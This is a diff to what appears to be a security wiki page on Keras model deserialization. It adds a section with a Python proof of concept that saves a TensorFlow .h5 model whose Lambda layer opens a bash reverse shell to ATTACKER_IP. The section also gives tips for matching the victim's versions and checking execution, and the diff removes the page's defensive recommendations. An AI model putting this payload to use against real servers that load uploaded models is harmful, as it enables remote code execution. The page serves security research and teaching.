@@ -91,6 +91,39 @@ Security improvements (Keras ≥ 3.9):
 - Safe mode default: safe_mode=True blocks unsafe Lambda serialized-function loading
 - Basic type checking: deserialized objects must match expected types
 
+## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE
+
+Many production stacks still accept legacy TensorFlow-Keras HDF5 model files (.h5). If an attacker can upload a model that the server later loads or runs inference on, a Lambda layer can execute arbitrary Python on load/build/predict.
+
+Minimal PoC to craft a malicious .h5 that executes a reverse shell when deserialized or used:
+
+```python
+import tensorflow as tf
+
+def exploit(x):
+    import os
+    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
+    return x
+
+m = tf.keras.Sequential()
+m.add(tf.keras.layers.Input(shape=(64,)))
+m.add(tf.keras.layers.Lambda(exploit))
+m.compile()
+m.save("exploit.h5")  # legacy HDF5 container
+```
+
+Notes and reliability tips:
+- Trigger points: code may run multiple times (e.g., during layer build/first call, model.load_model, and predict/fit). Make payloads idempotent.
+- Version pinning: match the victim’s TF/Keras/Python to avoid serialization mismatches. For example, build artifacts under Python 3.8 with TensorFlow 2.13.1 if that’s what the target uses.
+- Quick environment replication:
+
+```dockerfile
+FROM python:3.8-slim
+RUN pip install tensorflow-cpu==2.13.1
+```
+
+- Validation: a benign payload like os.system("ping -c 1 YOUR_IP") helps confirm execution (e.g., observe ICMP with tcpdump) before switching to a reverse shell.
+
 ## Post-fix gadget surface inside allowlist
 
 Even with allowlisting and safe mode, a broad surface remains among allowed Keras callables. For example, keras.utils.get_file can download arbitrary URLs to user-selectable locations.
@@ -115,97 +148,6 @@ Gadget via Lambda that references an allowed function (not serialized Python byt
 
 Important limitation:
 - Lambda.call() prepends the input tensor as the first positional argument when invoking the target callable. Chosen gadgets must tolerate an extra positional arg (or accept *args/**kwargs). This constrains which functions are viable.
-
-Potential impacts of allowlisted gadgets:
-- Arbitrary download/write (path planting, config poisoning)
-- Network callbacks/SSRF-like effects depending on environment
-- Chaining to code execution if written paths are later imported/executed or added to PYTHONPATH, or if a writable execution-on-write location exists
-
-## Researcher toolkit
-
-1) Systematic gadget discovery in allowed modules
-
-Enumerate candidate callables across keras, keras_nlp, keras_cv, keras_hub and prioritize those with file/network/process/env side effects.
-
-```python
-import importlib, inspect, pkgutil
-
-ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]
-
-seen = set()
-
-def iter_modules(mod):
-    if not hasattr(mod, "__path__"):
-        return
-    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
-        yield m.name
-
-candidates = []
-for root in ALLOWLIST:
-    try:
-        r = importlib.import_module(root)
-    except Exception:
-        continue
-    for name in iter_modules(r):
-        if name in seen:
-            continue
-        seen.add(name)
-        try:
-            m = importlib.import_module(name)
-        except Exception:
-            continue
-        for n, obj in inspect.getmembers(m):
-            if inspect.isfunction(obj) or inspect.isclass(obj):
-                sig = None
-                try:
-                    sig = str(inspect.signature(obj))
-                except Exception:
-                    pass
-                doc = (inspect.getdoc(obj) or "").lower()
-                text = f"{name}.{n} {sig} :: {doc}"
-                # Heuristics: look for I/O or network-ish hints
-                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
-                    candidates.append(text)
-
-print("\n".join(sorted(candidates)[:200]))
-```
-
-2) Direct deserialization testing (no .keras archive needed)
-
-Feed crafted dicts directly into Keras deserializers to learn accepted params and observe side effects.
-
-```python
-from keras import layers
-
-cfg = {
-  "module": "keras.layers",
-  "class_name": "Lambda",
-  "config": {
-    "name": "probe",
-    "function": {"module": "keras.utils", "class_name": "get_file"},
-    "arguments": {"fname": "x", "origin": "https://example.com/x"}
-  }
-}
-
-layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
-```
-
-3) Cross-version probing and formats
-
-Keras exists in multiple codebases/eras with different guardrails and formats:
-- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)
-- tf-keras: maintained separately
-- Multi-backend Keras 3 (official): introduced native .keras
-
-Repeat tests across codebases and formats (.keras vs legacy HDF5) to uncover regressions or missing guards.
-
-## Defensive recommendations
-
-- Treat model files as untrusted input. Only load models from trusted sources.
-- Keep Keras up to date; use Keras ≥ 3.9 to benefit from allowlisting and type checks.
-- Do not set safe_mode=False when loading models unless you fully trust the file.
-- Consider running deserialization in a sandboxed, least-privileged environment without network egress and with restricted filesystem access.
-- Enforce allowlists/signatures for model sources and integrity checking where possible.
 
 ## ML pickle import allowlisting for AI/ML models (Fickling)
 
@@ -254,6 +196,90 @@ fickling.hook.activate_safe_ml_environment(also_allow=[
 
 This allowlist-first strategy demonstrably blocks common ML pickle exploit paths while keeping compatibility high. In ToB’s benchmark, Fickling flagged 100% of synthetic malicious files and allowed ~99% of clean files from top Hugging Face repos.
 
+
+## Researcher toolkit
+
+1) Systematic gadget discovery in allowed modules
+
+Enumerate candidate callables across keras, keras_nlp, keras_cv, keras_hub and prioritize those with file/network/process/env side effects.
+
+<details>
+<summary>Enumerate potentially dangerous callables in allowlisted Keras modules</summary>
+
+```python
+import importlib, inspect, pkgutil
+
+ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]
+
+seen = set()
+
+def iter_modules(mod):
+    if not hasattr(mod, "__path__"):
+        return
+    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
+        yield m.name
+
+candidates = []
+for root in ALLOWLIST:
+    try:
+        r = importlib.import_module(root)
+    except Exception:
+        continue
+    for name in iter_modules(r):
+        if name in seen:
+            continue
+        seen.add(name)
+        try:
+            m = importlib.import_module(name)
+        except Exception:
+            continue
+        for n, obj in inspect.getmembers(m):
+            if inspect.isfunction(obj) or inspect.isclass(obj):
+                sig = None
+                try:
+                    sig = str(inspect.signature(obj))
+                except Exception:
+                    pass
+                doc = (inspect.getdoc(obj) or "").lower()
+                text = f"{name}.{n} {sig} :: {doc}"
+                # Heuristics: look for I/O or network-ish hints
+                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
+                    candidates.append(text)
+
+print("\n".join(sorted(candidates)[:200]))
+```
+
+</details>
+
+2) Direct deserialization testing (no .keras archive needed)
+
+Feed crafted dicts directly into Keras deserializers to learn accepted params and observe side effects.
+
+```python
+from keras import layers
+
+cfg = {
+  "module": "keras.layers",
+  "class_name": "Lambda",
+  "config": {
+    "name": "probe",
+    "function": {"module": "keras.utils", "class_name": "get_file"},
+    "arguments": {"fname": "x", "origin": "https://example.com/x"}
+  }
+}
+
+layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
+```
+
+3) Cross-version probing and formats
+
+Keras exists in multiple codebases/eras with different guardrails and formats:
+- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)
+- tf-keras: maintained separately
+- Multi-backend Keras 3 (official): introduced native .keras
+
+Repeat tests across codebases and formats (.keras vs legacy HDF5) to uncover regressions or missing guards.
+
 ## References
 
 - [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
@@ -262,6 +288,7 @@ This allowlist-first strategy demonstrably blocks common ML pickle exploit paths
 - [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
 - [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
 - [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
+- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
 - [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
 - [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
 - [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
